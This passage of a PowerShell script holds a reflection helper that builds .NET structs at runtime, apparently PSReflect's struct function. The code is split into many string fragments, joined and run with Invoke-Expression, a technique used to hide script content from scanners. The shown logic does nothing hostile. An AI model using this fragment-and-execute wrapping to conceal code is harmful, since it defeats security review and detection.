     ','             ','  $UnmanagedT','ype, $SizeCon','st, @($Size))','
            ','}
           ',' else
       ','     {
      ','          $At','tribBuilder =',' New-Object R','eflection.Emi','t.CustomAttri','buteBuilder($','ConstructorIn','fo, [Object[]','] @($Unmanage','dType))
     ','       }

   ','         $New','Field.SetCust','omAttribute($','AttribBuilder',')
        }

','        if ($','ExplicitLayou','t) { $NewFiel','d.SetOffset($','Offset) }
   ',' }

    # Mak','e the struct ','aware of its ','own size.
   ',' # No more ha','ving to call ','[Runtime.Inte','ropServices.M','arshal]::Size','Of!
    $Size','Method = $Str','uctBuilder.De','fineMethod(''G','etSize'',
    ','    ''Public, ','Static'',
    ','    [Int],
  ','      [Type[]','] @())
    $I','LGenerator = ','$SizeMethod.G','etILGenerator','()
    # Than','ks for the he','lp, Jason Shi','rk!
    $ILGe','nerator.Emit(','[Reflection.E','mit.OpCodes]:',':Ldtoken, $St','ructBuilder)
','    $ILGenera','tor.Emit([Ref','lection.Emit.','OpCodes]::Cal','l,
        [T','ype].GetMetho','d(''GetTypeFro','mHandle''))
  ','  $ILGenerato','r.Emit([Refle','ction.Emit.Op','Codes]::Call,','
        [Run','time.InteropS','ervices.Marsh','al].GetMethod','(''SizeOf'', [T','ype[]] @([Typ','e])))
    $IL','Generator.Emi','t([Reflection','.Emit.OpCodes',']::Ret)

    ','# Allow for e','xplicit casti','ng from an In','tPtr
    # No',' more having ','to call [Runt','ime.InteropSe','rvices.Marsha','l]::PtrToStru','cture!
    $I','mplicitConver','ter = $Struct','Builder.Defin','eMethod(''op_I','mplicit'',
   ','     ''Private','Scope, Public',', Static, Hid','eBySig, Speci','alName'',
    ','    $StructBu','ilder,
      ','  [Type[]] @(','[IntPtr]))
  ','  $ILGenerato','r2 = $Implici','tConverter.Ge','tILGenerator(',')
    $ILGene','rator2.Emit([','Reflection.Em','it.OpCodes]::','Nop)
    $ILG','enerator2.Emi','t([Reflection','.Emit.OpCodes',']::Ldarg_0)
 ','   $ILGenerat','or2.Emit([Ref','lection.Emit.','OpCodes]::Ldt','oken, $Struct','Builder)
    ','$ILGenerator2','.Emit([Reflec','tion.Emit.OpC','odes]::Call,
','        [Type','].GetMethod(''','GetTypeFromHa','ndle''))
    $','ILGenerator2.','Emit([Reflect','ion.Emit.OpCo','des]::Call,
 ','       [Runti','me.InteropSer','vices.Marshal','].GetMethod(''','PtrToStructur','e'', [Type[]] ','@([IntPtr], [','Type])))
    ','$ILGenerator2','.Emit([Reflec','tion.Emit.OpC','odes]::Unbox_','Any, $StructB','uilder)
    $','ILGenerator2.','Emit([Reflect','ion.Emit.OpCo','des]::Ret)

 ','   $StructBui','lder.CreateTy','pe()
}
'); $script = $fragments -join ''; Invoke-Expression $script